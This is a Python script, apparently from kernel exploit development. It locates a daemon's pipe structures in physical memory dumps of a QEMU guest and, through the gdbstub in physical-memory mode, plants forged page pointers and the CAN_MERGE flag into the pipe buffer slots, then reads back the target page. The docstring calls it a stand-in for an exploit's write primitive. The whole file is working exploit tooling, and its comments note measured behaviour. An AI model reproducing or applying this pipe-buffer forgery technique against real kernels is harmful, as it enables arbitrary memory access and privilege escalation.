"""Prototype plant: find the daemon's prim pipe in a physical dump and write the
forged page pointer straight into its bufs[] slots through the QEMU gdbstub in
*physical* memory mode (Qqemu.PhyMemMode), then read the words back.

This is the host-side stand-in for the exploit's one-write plant: it isolates the
question "does copy_page_to_iter() read the page the forged pointer names?" from
the write-primitive plumbing.

Usage:
  shot_patch.py --target 0x435f9000 [--offset 0x990] [--gdb 4478] [--dry]
                [--chunk gsp0.bin --chunk gsp1.bin ...]
"""
import socket
import struct
import sys
import time

DMAP, MEMSTART, VMEM, SPS = 0xffffff8000000000, 0x40000000, 0xfffffffe00000000, 0x40
P_HEAD, P_TAIL, P_MAX, P_RING, P_BUFS = 0x60, 0x64, 0x68, 0x6c, 0xa8
RINGS = (1, 2, 4, 8, 16, 32, 64, 128, 256)
SIGS = (b'AUTOPROBE', b'GLPIPESLT')
MBOX_SIG = b'GLMAILBOX'


def rsp_connect(port):
    s = socket.create_connection(('127.0.0.1', port), timeout=15)
    s.settimeout(25)

    def rd():
        b = b''
        while True:
            c = s.recv(1)
            if c == b'$':
                break
        while True:
            c = s.recv(1)
            if c == b'#':
                break
            b += c
        s.recv(2)
        s.sendall(b'+')
        return b.decode('latin1')

    def cmd(d, wait=True):
        cs = sum(d.encode('latin1')) & 0xff
        s.sendall(('$' + d + '#' + '%02x' % cs).encode())
        return rd() if wait else ''

    return s, cmd, rd


def main():
    global args_wait
    chunks, target, off, port, dry = [], 0x435f9000, 0x990, 4478, False
    base, scan_start, scan_len = 0x40000000, 0x100000000, 0x4000000
    args_wait = 40
    a = sys.argv[1:]
    i = 0
    while i < len(a):
        if a[i] == '--chunk':
            chunks.append(a[i + 1]); i += 2
        elif a[i] == '--target':
            target = int(a[i + 1], 0); i += 2
        elif a[i] == '--offset':
            off = int(a[i + 1], 0); i += 2
        elif a[i] == '--gdb':
            port = int(a[i + 1], 0); i += 2
        elif a[i] == '--wait':
            args_wait = int(a[i + 1], 0); i += 2
        elif a[i] == '--dry':
            dry = True; i += 1
        else:
            print('unknown arg', a[i]); return 2
    if not chunks:
        chunks = ['gsp%d.bin' % k for k in range(4)]

    parts, phys = [], base
    for c in chunks:
        parts.append((phys, open(c, 'rb').read())); phys += 1 << 30

    def rd_phys(p, n):
        for b, d in parts:
            if b <= p and p + n <= b + len(d):
                return d[p - b:p - b + n]
        return None

    vpage = VMEM + ((target - MEMSTART) >> 12) * SPS
    print('target phys 0x%x -> struct page 0x%x (page base 0x%x, offset 0x%x)'
          % (target, vpage, target & ~0xfff, off))

    pages = set()
    for b, d in parts:
        for sig in SIGS:
            st = 0
            while True:
                j = d.find(sig, st)
                if j < 0:
                    break
                pages.add((b + j) & ~0xfff)
                st = j + 1
    print('shot-buffer pages: %s' % [hex(p) for p in sorted(pages)])
    if not pages:
        print('!! shot buffer not found -- did step 0 run?'); return 1

    mbox_phys = None
    for b, d in parts:
        j = d.find(MBOX_SIG)
        if j >= 0:
            mbox_phys = b + j
            print('mailbox page phys 0x%x: %r' % (mbox_phys,
                  d[j:j + 160].split(b'\n')[0]))
            break
    if mbox_phys is None:
        print('!! mailbox not found')

    region = None
    for b, d in parts:
        if b <= scan_start < b + len(d):
            region = d[scan_start - b:scan_start - b + scan_len]
    if region is None:
        print('scan range not in dump'); return 2

    pipes = []
    for o in range(0, len(region) - 0xc0, 8):
        head, tail, mx, ring = struct.unpack_from('<IIII', region, o + P_HEAD)
        if ring not in RINGS or mx == 0 or mx > ring or tail > head or head > ring:
            continue
        bufs = struct.unpack_from('<Q', region, o + P_BUFS)[0]
        if not (DMAP <= bufs < DMAP + 0x100000000):
            continue
        for k in range(ring):
            slot = rd_phys((bufs - DMAP) + MEMSTART + k * 0x28, 0x28)
            if slot is None:
                continue
            if struct.unpack_from('<Q', slot, 0)[0] not in \
                    [VMEM + ((p - MEMSTART) >> 12) * SPS for p in pages]:
                continue
            off_, ln = struct.unpack_from('<II', slot, 8)
            ops = struct.unpack_from('<Q', slot, 0x10)[0]
            pipes.append(dict(pi=DMAP + (scan_start + o - MEMSTART), head=head, tail=tail,
                              ring=ring, bufs=bufs, slot=k, off=off_, ln=ln, ops=ops))
    print('pipes holding a shot page: %d' % len(pipes))
    for p in pipes:
        print('  pi=0x%x bufs=0x%x slot=%d offset=%d len=%d ops=0x%x head=%d tail=%d ring=%d'
              % (p['pi'], p['bufs'], p['slot'], p['off'], p['ln'], p['ops'],
                 p['head'], p['tail'], p['ring']))
    if not pipes:
        return 1
    # the prim pipe is the daemon's own; pick the one whose live buffer carries
    # anon_pipe_buf_ops (0xffffffc0... .rodata) and a non-zero len
    prim = None
    for p in sorted(pipes, key=lambda q: -q['ln']):
        if p['ln'] > 0 and 0xffffffc000000000 <= p['ops'] < 0xffffffc100000000:
            prim = p
            break
    if prim is None:
        prim = pipes[0]
    print('chosen prim pipe: pi=0x%x bufs=0x%x ring=%d (slot %d offset %d len %d)'
          % (prim['pi'], prim['bufs'], prim['ring'], prim['slot'], prim['off'], prim['ln']))

    # patch every slot of that pipe's bufs array: page = V(target), and
    # (offset, len) = (off, 9) so a read of 8 bytes stays inside the window and
    # lands at target+off.
    writes = []
    for k in range(prim['ring']):
        slot_phys = (prim['bufs'] - DMAP) + MEMSTART + k * 0x28
        writes.append((slot_phys, struct.pack('<Q', vpage).hex()))
        writes.append((slot_phys + 8, struct.pack('<I', off).hex() +
                       struct.pack('<I', 9).hex()))
        # flags: PIPE_BUF_FLAG_CAN_MERGE (0x10).  Without it pipe_write() treats
        # the slot as empty, allocates a real page into it and silently overwrites
        # the planted page pointer (measured: the next read fell back to the
        # daemon's own anon page).
        writes.append((slot_phys + 0x18, struct.pack('<I', 0x10).hex() +
                       struct.pack('<I', 0).hex()))
    print('planting %d words into bufs=0x%x' % (len(writes), prim['bufs']))
    if dry:
        for addr, data in writes[:6]:
            print('  dry: 0x%x <- %s' % (addr, data))
        return 0

    s, cmd, rd = rsp_connect(port)
    print('  stop  :', cmd('?'))
    cmd('c', wait=False); time.sleep(0.4)
    s.sendall(b'\x03'); rd()
    print('  halted:', cmd('?'))
    print('  phymode on :', cmd('Qqemu.PhyMemMode:1'))
    for addr, data in writes:
        cmd('M%x,%d:%s' % (addr, len(data) // 2, data))
    slot0 = (prim['bufs'] - DMAP) + MEMSTART
    print('  readback slot0 page   :', cmd('m%x,8' % slot0))
    print('  readback slot0 off/len:', cmd('m%x,8' % (slot0 + 8)))
    print('  readback slot0 flags  :', cmd('m%x,4' % (slot0 + 0x18)))
    print('  phymode off:', cmd('Qqemu.PhyMemMode:0'))
    cmd('c', wait=False)
    print('  planted; waiting %ds for the loop to write/read through it' % args_wait)
    time.sleep(args_wait)
    s.sendall(b'\x03'); rd()
    print('  halt:', cmd('?'))
    cmd('Qqemu.PhyMemMode:1')
    win = cmd('m%x,40' % ((target & ~0xfff) + off))
    slot_now = cmd('m%x,20' % slot0)
    cmd('Qqemu.PhyMemMode:0')
    cmd('c', wait=False)
    try:
        raw = bytes.fromhex(win)
        print('  target page +0x%x : %s' % (off, raw.hex()))
        print('    contains "GLPIPESLT": %s' % (b'GLPIPESLT' in raw))
    except Exception:
        print('  target readback failed: %r' % win)
    try:
        print('  slot0 now: %s' % bytes.fromhex(slot_now).hex())
    except Exception:
        print('  slot0 readback failed: %r' % slot_now)
    if mbox_phys is not None:
        import time as _t
        print('  waiting for the prober to publish through the planted page ...')
        _t.sleep(args_wait)
        cmd('Qqemu.PhyMemMode:1')
        text = ''
        for off in range(0, 0x400, 0x100):
            rep = cmd('m%x,100' % (mbox_phys + off))
            try:
                text += bytes.fromhex(rep).decode('latin1')
            except Exception:
                pass
        cmd('Qqemu.PhyMemMode:0')
        cmd('c', wait=False)
        print('  mailbox readout:')
        for ln in text.split('\n'):
            ln = ln.strip()
            if ln:
                print('    | ' + ln)
    s.close()
    print('planted; guest resumed')
    return 0


if __name__ == '__main__':
    sys.exit(main())
